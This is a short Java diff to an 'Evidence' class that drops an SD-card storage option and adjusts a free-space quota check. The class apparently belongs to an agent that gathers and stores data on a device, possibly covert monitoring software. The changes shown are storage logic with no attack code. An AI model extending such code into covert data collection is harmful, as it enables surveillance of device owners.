@@ -69,7 +69,6 @@ public final class Evidence {
     Device device;
 
     int evidenceId;
-    boolean onSD;
 
     int progressive;
 
@@ -280,7 +279,7 @@ public final class Evidence {
         }
 
         if (!forced) {
-            enoughSpace = enoughSpace(onSD);
+            enoughSpace = enoughSpace();
             if (!enoughSpace) {
                 //#ifdef DEBUG
                 debug.trace("createEvidence, no space");
@@ -290,7 +289,7 @@ public final class Evidence {
         }
 
         final Vector tuple = evidenceCollector.makeNewName(this,
-                memoTypeEvidence(typeEvidenceId), onSD);
+                memoTypeEvidence(typeEvidenceId), false);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -383,13 +382,9 @@ public final class Evidence {
         return true;
     }
 
-    private boolean enoughSpace(boolean onSD) {
+    private boolean enoughSpace() {
         long free = 0;
-        if (onSD) {
-            free = Path.freeSpace(Path.SD);
-        } else {
-            free = Path.freeSpace(Path.USER);
-        }
+        free = Path.freeSpace(Path.USER);
 
         Globals globals = Status.self().getGlobals();
         long minQuota = MIN_AVAILABLE_SIZE;
@@ -397,7 +392,7 @@ public final class Evidence {
             minQuota = globals.getQuotaMin();
         }
 
-        if (free < minQuota) {
+        if (minQuota >= 0 && free < minQuota) {
             //#ifdef DEBUG
             debug.trace("not enoughSpace: " + free + " < " + minQuota);
             //#endif
